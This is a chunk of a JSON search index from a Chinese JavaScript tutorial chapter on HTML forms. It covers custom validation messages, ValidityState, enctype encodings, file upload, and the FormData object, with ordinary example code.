\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u66ff\u6362\u6d4f\u89c8\u5668\u5185\u7f6e\u7684\u8868\u5355\u9a8c\u8bc1\u62a5\u9519\u4fe1\u606f\uff0c\u53c2\u6570\u5c31\u662f\u8981\u663e\u793a\u7684\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 < form action = \"somefile.php\" > < input type = \"text\" name = \"username\" placeholder = \"Username\" pattern = \"[a-z]{1,15}\" id = \"username\" > < input type = \"submit\" > </ form > \u4e0a\u9762\u7684\u8868\u5355\u8f93\u5165\u6846\uff0c\u8981\u6c42\u53ea\u80fd\u8f93\u5165\u5c0f\u5199\u5b57\u6bcd\uff0c\u4e14\u4e0d\u5f97\u8d85\u8fc715\u4e2a\u5b57\u7b26\u3002\u5982\u679c\u8f93\u5165\u4e0d\u7b26\u5408\u8981\u6c42\uff08\u6bd4\u5982\u8f93\u5165\u201cABC\u201d\uff09\uff0c\u63d0\u4ea4\u8868\u5355\u7684\u65f6\u5019\uff0cChrome \u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u62a5\u9519\u4fe1\u606f\u201cPlease match the requested format.\u201d\uff0c\u7981\u6b62\u8868\u5355\u63d0\u4ea4\u3002\u4e0b\u9762\u4f7f\u7528 setCustomValidity() \u65b9\u6cd5\u66ff\u6362\u6389\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 var input = document . getElementById ( 'username' ); input . oninvalid = function ( event ) { event . target . setCustomValidity ( '\u7528\u6237\u540d\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd\uff0c\u4e0d\u80fd\u4e3a\u7a7a\uff0c\u6700\u957f\u4e0d\u8d85\u8fc715\u4e2a\u5b57\u7b26' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setCustomValidity() \u65b9\u6cd5\u662f\u5728 invalid \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002\u8be5\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\uff0c\u8fd9\u65f6\u5982\u679c\u53c2\u6570\u4e0d\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u8ba4\u4e3a\u8be5\u63a7\u4ef6\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\uff0c\u5c31\u4f1a\u7acb\u523b\u663e\u793a\u8be5\u65b9\u6cd5\u8bbe\u7f6e\u7684\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* HTML \u4ee3\u7801\u5982\u4e0b <form> <p><input type=\"file\" id=\"fs\"></p> <p><input type=\"submit\"></p> </form> */ document . getElementById ( 'fs' ). onchange = checkFileSize ; function checkFileSize () { var fs = document . getElementById ( 'fs' ); var files = fs . files ; if ( files . length > 0 ) { if ( files [ 0 ]. size > 75 * 1024 ) { fs . setCustomValidity ( '\u6587\u4ef6\u4e0d\u80fd\u5927\u4e8e 75KB' ); return ; } } fs . setCustomValidity ( '' ); } \u4e0a\u9762\u4ee3\u7801\u4e00\u65e6\u53d1\u73b0\u6587\u4ef6\u5927\u4e8e 75KB\uff0c\u5c31\u4f1a\u8bbe\u7f6e\u6821\u9a8c\u5931\u8d25\uff0c\u540c\u65f6\u7ed9\u51fa\u81ea\u5b9a\u4e49\u7684\u62a5\u9519\u4fe1\u606f\u3002\u7136\u540e\uff0c\u70b9\u51fb\u63d0\u4ea4\u6309\u94ae\u65f6\uff0c\u5c31\u4f1a\u663e\u793a\u62a5\u9519\u4fe1\u606f\u3002\u8fd9\u79cd\u6821\u9a8c\u5931\u8d25\u662f\u4e0d\u4f1a\u81ea\u52a8\u6d88\u9664\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6240\u6709\u6587\u4ef6\u90fd\u7b26\u5408\u6761\u4ef6\uff0c\u8981\u5c06\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u624b\u52a8\u6d88\u9664\u6821\u9a8c\u5931\u8d25\u7684\u72b6\u6001\u3002 validity \u5c5e\u6027 \u00b6 \u63a7\u4ef6\u5143\u7d20\u7684\u5c5e\u6027 validity \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a ValidityState \u5bf9\u8c61\uff0c\u5305\u542b\u5f53\u524d\u6821\u9a8c\u72b6\u6001\u7684\u4fe1\u606f\u3002 \u8be5\u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\uff0c\u5168\u90e8\u4e3a\u53ea\u8bfb\u5c5e\u6027\u3002 ValidityState.badInput \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u4e0d\u80fd\u5c06\u7528\u6237\u7684\u8f93\u5165\u8f6c\u6362\u6210\u6b63\u786e\u7684\u7c7b\u578b\uff0c\u6bd4\u5982\u7528\u6237\u5728\u6570\u503c\u6846\u91cc\u9762\u8f93\u5165\u5b57\u7b26\u4e32\u3002 ValidityState.customError \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5df2\u7ecf\u8c03\u7528 setCustomValidity() \u65b9\u6cd5\uff0c\u5c06\u6821\u9a8c\u4fe1\u606f\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\u4e32\u3002 ValidityState.patternMismatch \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u4e0d\u6ee1\u8db3\u6a21\u5f0f\u7684\u8981\u6c42\u3002 ValidityState.rangeOverflow \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u5927\u4e8e\u6700\u5927\u8303\u56f4\u3002 ValidityState.rangeUnderflow \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u5c0f\u4e8e\u6700\u5c0f\u8303\u56f4\u3002 ValidityState.stepMismatch \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u4e0d\u7b26\u5408\u6b65\u957f\u7684\u8bbe\u7f6e\uff08\u5373\u4e0d\u80fd\u88ab\u6b65\u957f\u503c\u6574\u9664\uff09\u3002 ValidityState.tooLong \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u5b57\u6570\u8d85\u51fa\u4e86\u6700\u957f\u5b57\u6570\u3002 ValidityState.tooShort \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u5c11\u4e8e\u6700\u77ed\u5b57\u6570\u3002 ValidityState.typeMismatch \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u586b\u5165\u7684\u503c\u4e0d\u7b26\u5408\u7c7b\u578b\u8981\u6c42\uff08\u4e3b\u8981\u662f\u7c7b\u578b\u4e3a Email \u6216 URL \u7684\u60c5\u51b5\uff09\u3002 ValidityState.valid \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u662f\u5426\u6ee1\u8db3\u6240\u6709\u6821\u9a8c\u6761\u4ef6\u3002 ValidityState.valueMissing \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u6ca1\u6709\u586b\u5165\u5fc5\u586b\u7684\u503c\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 var input = document . getElementById ( 'myinput' ); if ( input . validity . valid ) { console . log ( '\u901a\u8fc7\u6821\u9a8c' ); } else { console . log ( '\u6821\u9a8c\u5931\u8d25' ); } \u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 var txt = '' ; if ( document . getElementById ( 'myInput' ). validity . rangeOverflow ) { txt = '\u6570\u503c\u8d85\u8fc7\u4e0a\u9650' ; } document . getElementById ( 'prompt' ). innerHTML = txt ; \u5982\u679c\u60f3\u7981\u6b62\u6d4f\u89c8\u5668\u5f39\u51fa\u8868\u5355\u9a8c\u8bc1\u7684\u62a5\u9519\u4fe1\u606f\uff0c\u53ef\u4ee5\u76d1\u542c invalid \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var input = document . getElementById ( 'username' ); var form = document . getElementById ( 'form' ); var elem = document . createElement ( 'div' ); elem . id = 'notify' ; elem . style . display = 'none' ; form . appendChild ( elem ); input . addEventListener ( 'invalid' , function ( event ) { event . preventDefault (); if ( ! event . target . validity . valid ) { elem . textContent = '\u7528\u6237\u540d\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd' ; elem . className = 'error' ; elem . style . display = 'block' ; input . className = 'invalid animated shake' ; } }); input . addEventListener ( 'input' , function ( event ){ if ( 'block' === elem . style . display ) { input . className = '' ; elem . style . display = 'none' ; } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u65e6\u53d1\u751f invalid \u4e8b\u4ef6\uff08\u8868\u5355\u9a8c\u8bc1\u5931\u8d25\uff09\uff0c event.preventDefault() \u7528\u6765\u7981\u6b62\u6d4f\u89c8\u5668\u5f39\u51fa\u9ed8\u8ba4\u7684\u9a8c\u8bc1\u5931\u8d25\u63d0\u793a\uff0c\u7136\u540e\u8bbe\u7f6e\u5b9a\u5236\u7684\u62a5\u9519\u63d0\u793a\u6846\u3002 \u8868\u5355\u7684 novalidate \u5c5e\u6027 \u00b6 \u8868\u5355\u5143\u7d20\u7684 HTML \u5c5e\u6027 novalidate \uff0c\u53ef\u4ee5\u5173\u95ed\u6d4f\u89c8\u5668\u7684\u81ea\u52a8\u6821\u9a8c\u3002 1 2 < form novalidate > </ form > \u8fd9\u4e2a\u5c5e\u6027\u4e5f\u53ef\u4ee5\u5728\u811a\u672c\u91cc\u8bbe\u7f6e\u3002 1 form . noValidate = true ; \u5982\u679c\u8868\u5355\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e novalidate \u5c5e\u6027\uff0c\u90a3\u4e48\u63d0\u4ea4\u6309\u94ae\uff08 <button> \u6216 <input> \u5143\u7d20\uff09\u7684 formnovalidate \u5c5e\u6027\u4e5f\u6709\u540c\u6837\u7684\u4f5c\u7528\u3002 1 2 3 < form > < input type = \"submit\" value = \"submit\" formnovalidate > </ form > enctype \u5c5e\u6027 \u00b6 \u8868\u5355\u80fd\u591f\u7528\u56db\u79cd\u7f16\u7801\uff0c\u5411\u670d\u52a1\u5668\u53d1\u9001\u6570\u636e\u3002\u7f16\u7801\u683c\u5f0f\u7531\u8868\u5355\u7684 enctype \u5c5e\u6027\u51b3\u5b9a\u3002 \u5047\u5b9a\u8868\u5355\u6709\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662f foo \u548c baz \uff0c\u5176\u4e2d foo \u5b57\u6bb5\u7684\u503c\u7b49\u4e8e bar \uff0c baz \u5b57\u6bb5\u7684\u503c\u662f\u4e00\u4e2a\u5206\u4e3a\u4e24\u884c\u7684\u5b57\u7b26\u4e32\u3002 1 2 The first line. The second line. \u4e0b\u9762\u56db\u79cd\u683c\u5f0f\uff0c\u90fd\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u8868\u5355\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 \uff081\uff09GET \u65b9\u6cd5 \u5982\u679c\u8868\u5355\u4f7f\u7528 GET \u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c enctype \u5c5e\u6027\u65e0\u6548\u3002 1 2 3 4 5 6 < form action = \"register.php\" method = \"get\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u6570\u636e\u5c06\u4ee5 URL \u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u53d1\u51fa\u3002 1 ?foo=bar&baz=The%20first%20line.%0AThe%20second%20line. \uff082\uff09application/x-www-form-urlencoded \u5982\u679c\u8868\u5355\u7528 POST \u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c\u5e76\u7701\u7565 enctype \u5c5e\u6027\uff0c\u90a3\u4e48\u6570\u636e\u4ee5 application/x-www-form-urlencoded \u683c\u5f0f\u53d1\u9001\uff08\u56e0\u4e3a\u8fd9\u662f\u9ed8\u8ba4\u503c\uff09\u3002 1 2 3 4 5 6 < form action = \"register.php\" method = \"post\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002 1 2 3 Content-Type: application/x-www-form-urlencoded foo=bar&baz=The+first+line.%0D%0AThe+second+line.%0D%0A \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u636e\u4f53\u91cc\u9762\u7684 %0D%0A \u4ee3\u8868\u6362\u884c\u7b26\uff08 \\r\\n \uff09\u3002 \uff083\uff09text/plain \u5982\u679c\u8868\u5355\u4f7f\u7528 POST \u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c enctype \u5c5e\u6027\u4e3a text/plain \uff0c\u90a3\u4e48\u6570\u636e\u5c06\u4ee5\u7eaf\u6587\u672c\u683c\u5f0f\u53d1\u9001\u3002 1 2 3 4 5 6 7 < form action = \"register.php\" method = \"post\" enctype = \"text/plain\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002 1 2 3 4 5 Content-Type: text/plain foo=bar baz=The first line. The second line. \uff084\uff09multipart/form-data \u5982\u679c\u8868\u5355\u4f7f\u7528 POST \u65b9\u6cd5\uff0c enctype \u5c5e\u6027\u4e3a multipart/form-data \uff0c\u90a3\u4e48\u6570\u636e\u5c06\u4ee5\u6df7\u5408\u7684\u683c\u5f0f\u53d1\u9001\u3002 1 2 3 4 5 6 7 < form action = \"register.php\" method = \"post\" enctype = \"multipart/form-data\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 Content-Type: multipart/form-data; boundary=---------------------------314911788813839 -----------------------------314911788813839 Content-Disposition: form-data; name=\"foo\" bar -----------------------------314911788813839 Content-Disposition: form-data; name=\"baz\" The first line. The second line. -----------------------------314911788813839-- \u8fd9\u79cd\u683c\u5f0f\u4e5f\u662f\u6587\u4ef6\u4e0a\u4f20\u7684\u683c\u5f0f\u3002 \u6587\u4ef6\u4e0a\u4f20 \u00b6 \u7528\u6237\u4e0a\u4f20\u6587\u4ef6\uff0c\u4e5f\u662f\u901a\u8fc7\u8868\u5355\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662f\u901a\u8fc7\u6587\u4ef6\u8f93\u5165\u6846\u9009\u62e9\u672c\u5730\u6587\u4ef6\uff0c\u63d0\u4ea4\u8868\u5355\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u6587\u4ef6\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 1 < input type = \"file\" id = \"file\" name = \"myFile\" > \u6b64\u5916\uff0c\u8fd8\u9700\u8981\u5c06\u8868\u5355 <form> \u5143\u7d20\u7684 method \u5c5e\u6027\u8bbe\u4e3a POST \uff0c enctype \u5c5e\u6027\u8bbe\u4e3a multipart/form-data \u3002\u5176\u4e2d\uff0c enctype \u5c5e\u6027\u51b3\u5b9a\u4e86 HTTP \u5934\u4fe1\u606f\u7684 Content-Type \u5b57\u6bb5\u7684\u503c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5b57\u6bb5\u7684\u503c\u662f application/x-www-form-urlencoded \uff0c\u4f46\u662f\u6587\u4ef6\u4e0a\u4f20\u7684\u65f6\u5019\u8981\u6539\u6210 multipart/form-data \u3002 1 2 3 4 5 6 7 8 9 < form method = \"post\" enctype = \"multipart/form-data\" > < div > < label for = \"file\" > \u9009\u62e9\u4e00\u4e2a\u6587\u4ef6 </ label > < input type = \"file\" id = \"file\" name = \"myFile\" multiple > </ div > < div > < input type = \"submit\" id = \"submit\" name = \"submit_button\" value = \"\u4e0a\u4f20\" /> </ div > </ form > \u4e0a\u9762\u7684 HTML \u4ee3\u7801\u4e2d\uff0cfile \u63a7\u4ef6\u7684 multiple \u5c5e\u6027\uff0c\u6307\u5b9a\u53ef\u4ee5\u4e00\u6b21\u9009\u62e9\u591a\u4e2a\u6587\u4ef6\uff1b\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5219\u4e00\u6b21\u53ea\u80fd\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\u3002 1 2 var fileSelect = document . getElementById ( 'file' ); var files = fileSelect . files ; \u7136\u540e\uff0c\u65b0\u5efa\u4e00\u4e2a FormData \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6a21\u62df\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8868\u5355\u6570\u636e\uff0c\u628a\u9009\u4e2d\u7684\u6587\u4ef6\u6dfb\u52a0\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var formData = new FormData (); for ( var i = 0 ; i < files . length ; i ++ ) { var file = files [ i ]; // \u53ea\u4e0a\u4f20\u56fe\u7247\u6587\u4ef6 if ( ! file . type . match ( 'image.*' )) { continue ; } formData . append ( 'photos[]' , file , file . name ); } \u6700\u540e\uff0c\u4f7f\u7528 Ajax \u5411\u670d\u52a1\u5668\u4e0a\u4f20\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , 'handler.php' , true ); xhr . onload = function () { if ( xhr . status !== 200 ) { console . log ( 'An error occurred!' ); } }; xhr . send ( formData ); \u9664\u4e86\u53d1\u9001 FormData \u5b9e\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5 AJAX \u53d1\u9001\u6587\u4ef6\u3002 1 2 3 4 5 6 var file = document . getElementById ( 'test-input' ). files [ 0 ]; var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , 'myserver/uploads' ); xhr . setRequestHeader ( 'Content-Type' , file . type ); xhr . send ( file ); \u53c2\u8003\u94fe\u63a5 \u00b6 HTML5 Form Validation With the \u201cpattern\u201d Attribute , Thoriq Firdaus","title":"\u8868\u5355\uff0cFormData \u5bf9\u8c61"},{"location":"bom/form/#formdata","text":"","title":"\u8868\u5355\uff0cFormData \u5bf9\u8c61"},{"location":"bom/form/#_1","text":"\u8868\u5355\uff08 <form> \uff09\u7528\u6765\u6536\u96c6\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u6bd4\u5982\uff0c\u7528\u6237\u63d0\u4ea4\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u8ba9\u670d\u52a1\u5668\u9a8c\u8bc1\uff0c\u5c31\u8981\u901a\u8fc7\u8868\u5355\u3002\u8868\u5355\u63d0\u4f9b\u591a\u79cd\u63a7\u4ef6\uff0c\u8ba9\u5f00\u53d1\u8005\u4f7f\u7528\uff0c\u5177\u4f53\u7684\u63a7\u4ef6\u79cd\u7c7b\u548c\u7528\u6cd5\u8bf7\u53c2\u8003 HTML \u8bed\u8a00\u7684\u6559\u7a0b\u3002\u672c\u7ae0\u4e3b\u8981\u4ecb\u7ecd JavaScript \u4e0e\u8868\u5355\u7684\u4ea4\u4e92\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 < form action = \"/handling-page\" method = \"post\" > < div > < label for = \"name\" > \u7528\u6237\u540d\uff1a </ label > < input type = \"text\" id = \"name\" name = \"user_name\" /> </ div > < div > < label for = \"passwd\" > \u5bc6\u7801\uff1a </ label > < input type = \"password\" id = \"passwd\" name = \"user_passwd\" /> </ div > < div > < input type = \"submit\" id = \"submit\" name = \"submit_button\" value = \"\u63d0\u4ea4\" /> </ div > </ form > \u4e0a\u9762\u4ee3\u7801\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8868\u5355\uff0c\u5305\u542b\u4e09\u4e2a\u63a7\u4ef6\uff1a\u7528\u6237\u540d\u8f93\u5165\u6846\u3001\u5bc6\u7801\u8f93\u5165\u6846\u548c\u63d0\u4ea4\u6309\u94ae\u3002 \u7528\u6237\u70b9\u51fb\u201c\u63d0\u4ea4\u201d\u6309\u94ae\uff0c\u6bcf\u4e00\u4e2a\u63a7\u4ef6\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u952e\u540d\u662f\u63a7\u4ef6\u7684 name \u5c5e\u6027\uff0c\u952e\u503c\u662f\u63a7\u4ef6\u7684 value \u5c5e\u6027\uff0c\u952e\u540d\u548c\u952e\u503c\u4e4b\u95f4\u7531\u7b49\u53f7\u8fde\u63a5\u3002\u6bd4\u5982\uff0c\u7528\u6237\u540d\u8f93\u5165\u6846\u7684 name \u5c5e\u6027\u662f user_name \uff0c value \u5c5e\u6027\u662f\u7528\u6237\u8f93\u5165\u7684\u503c\uff0c\u5047\u5b9a\u662f\u201c\u5f20\u4e09\u201d\uff0c\u63d0\u4ea4\u5230\u670d\u52a1\u5668\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u952e\u503c\u5bf9 user_name=\u5f20\u4e09 \u3002 \u6240\u6709\u7684\u952e\u503c\u5bf9\u90fd\u4f1a\u63d0\u4ea4\u5230\u670d\u52a1\u5668\u3002\u4f46\u662f\uff0c\u63d0\u4ea4\u7684\u6570\u636e\u683c\u5f0f\u8ddf <form> \u5143\u7d20\u7684 method \u5c5e\u6027\u6709\u5173\u3002\u8be5\u5c5e\u6027\u6307\u5b9a\u4e86\u63d0\u4ea4\u6570\u636e\u7684 HTTP \u65b9\u6cd5\u3002\u5982\u679c\u662f GET \u65b9\u6cd5\uff0c\u6240\u6709\u952e\u503c\u5bf9\u4f1a\u4ee5 URL \u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u63d0\u4ea4\u5230\u670d\u52a1\u5668\uff0c\u6bd4\u5982 /handling-page?user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 \u3002\u4e0b\u9762\u5c31\u662f GET \u8bf7\u6c42\u7684 HTTP \u5934\u4fe1\u606f\u3002 1 2 GET /handling-page?user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 Host: example.com \u5982\u679c\u662f POST \u65b9\u6cd5\uff0c\u6240\u6709\u952e\u503c\u5bf9\u4f1a\u8fde\u63a5\u6210\u4e00\u884c\uff0c\u4f5c\u4e3a HTTP \u8bf7\u6c42\u7684\u6570\u636e\u4f53\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u6bd4\u5982 user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 \u3002\u4e0b\u9762\u5c31\u662f POST \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u3002 1 2 3 4 5 6 POST /handling-page HTTP / 1.1 Host : example.com Content-Type : application/x-www-form-urlencoded Content-Length : 74 user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 \u6ce8\u610f\uff0c\u5b9e\u9645\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u53ea\u8981\u952e\u503c\u4e0d\u662f URL \u7684\u5408\u6cd5\u5b57\u7b26\uff08\u6bd4\u5982\u6c49\u5b57\u201c\u5f20\u4e09\u201d\u548c\u201c\u63d0\u4ea4\u201d\uff09\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u3002 \u70b9\u51fb submit \u63a7\u4ef6\uff0c\u5c31\u53ef\u4ee5\u63d0\u4ea4\u8868\u5355\u3002 1 2 3 < form > < input type = \"submit\" value = \"\u63d0\u4ea4\" > </ form > \u4e0a\u9762\u8868\u5355\u5c31\u5305\u542b\u4e00\u4e2a submit \u63a7\u4ef6\uff0c\u70b9\u51fb\u8fd9\u4e2a\u63a7\u4ef6\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u628a\u8868\u5355\u6570\u636e\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u3002 \u6ce8\u610f\uff0c\u8868\u5355\u91cc\u9762\u7684 <button> \u5143\u7d20\u5982\u679c\u6ca1\u6709\u7528 type \u5c5e\u6027\u6307\u5b9a\u7c7b\u578b\uff0c\u90a3\u4e48\u9ed8\u8ba4\u5c31\u662f submit \u63a7\u4ef6\u3002 1 2 3 < form > < button > \u63d0\u4ea4 </ button > </ form > \u4e0a\u9762\u8868\u5355\u7684 <button> \u5143\u7d20\uff0c\u70b9\u51fb\u4ee5\u540e\u4e5f\u4f1a\u63d0\u4ea4\u8868\u5355\u3002 \u9664\u4e86\u70b9\u51fb submit \u63a7\u4ef6\u63d0\u4ea4\u8868\u5355\uff0c\u8fd8\u53ef\u4ee5\u7528\u8868\u5355\u5143\u7d20\u7684 submit() \u65b9\u6cd5\uff0c\u901a\u8fc7\u811a\u672c\u63d0\u4ea4\u8868\u5355\u3002 1 formElement . submit (); \u8868\u5355\u5143\u7d20\u7684 reset() \u65b9\u6cd5\u53ef\u4ee5\u91cd\u7f6e\u6240\u6709\u63a7\u4ef6\u7684\u503c\uff08\u91cd\u7f6e\u4e3a\u9ed8\u8ba4\u503c\uff09\u3002 1 formElement . reset ()","title":"\u8868\u5355\u6982\u8ff0"},{"location":"bom/form/#formdata_1","text":"","title":"FormData \u5bf9\u8c61"},{"location":"bom/form/#_2","text":"\u8868\u5355\u6570\u636e\u4ee5\u952e\u503c\u5bf9\u7684\u5f62\u5f0f\u5411\u670d\u52a1\u5668\u53d1\u9001\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u6d4f\u89c8\u5668\u81ea\u52a8\u5b8c\u6210\u7684\u3002\u4f46\u662f\u6709\u65f6\u5019\uff0c\u6211\u4eec\u5e0c\u671b\u901a\u8fc7\u811a\u672c\u5b8c\u6210\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u6784\u9020\u6216\u7f16\u8f91\u8868\u5355\u7684\u952e\u503c\u5bf9\uff0c\u7136\u540e\u901a\u8fc7\u811a\u672c\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e86 FormData \u5bf9\u8c61\u6765\u5b8c\u6210\u8fd9\u9879\u5de5\u4f5c\u3002 FormData() \u9996\u5148\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u8868\u5355\u7684\u5b9e\u4f8b\u3002 1 var formdata = new FormData ( form ); FormData() \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a DOM \u7684\u8868\u5355\u5143\u7d20\uff0c\u6784\u9020\u51fd\u6570\u4f1a\u81ea\u52a8\u5904\u7406\u8868\u5355\u7684\u952e\u503c\u5bf9\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c\u7701\u7565\u8be5\u53c2\u6570\uff0c\u5c31\u8868\u793a\u4e00\u4e2a\u7a7a\u7684\u8868\u5355\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u8868\u5355\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 < form id = \"myForm\" name = \"myForm\" > < div > < label for = \"username\" > \u7528\u6237\u540d\uff1a </ label > < input type = \"text\" id = \"username\" name = \"username\" > </ div > < div > < label for = \"useracc\" > \u8d26\u53f7\uff1a </ label > < input type = \"text\" id = \"useracc\" name = \"useracc\" > </ div > < div > < label for = \"userfile\" > \u4e0a\u4f20\u6587\u4ef6\uff1a </ label > < input type = \"file\" id = \"userfile\" name = \"userfile\" > </ div > < input type = \"submit\" value = \"Submit!\" > </ form > \u6211\u4eec\u7528 FormData() \u5904\u7406\u4e0a\u9762\u8fd9\u4e2a\u8868\u5355\u3002 1 2 3 4 5 6 7 8 9 10 var myForm = document . getElementById ( 'myForm' ); var formData = new FormData ( myForm ); // \u83b7\u53d6\u67d0\u4e2a\u63a7\u4ef6\u7684\u503c formData . get ( 'username' ) // \"\" // \u8bbe\u7f6e\u67d0\u4e2a\u63a7\u4ef6\u7684\u503c formData . set ( 'username' , '\u5f20\u4e09' ); formData . get ( 'username' ) // \"\u5f20\u4e09\"","title":"\u6982\u8ff0"},{"location":"bom/form/#_3","text":"FormData \u63d0\u4f9b\u4ee5\u4e0b\u5b9e\u4f8b\u65b9\u6cd5\u3002 FormData.get(key) \uff1a\u83b7\u53d6\u6307\u5b9a\u952e\u540d\u5bf9\u5e94\u7684\u952e\u503c\uff0c\u53c2\u6570\u4e3a\u952e\u540d\u3002\u5982\u679c\u6709\u591a\u4e2a\u540c\u540d\u7684\u952e\u503c\u5bf9\uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u952e\u503c\u5bf9\u7684\u952e\u503c\u3002 FormData.getAll(key) 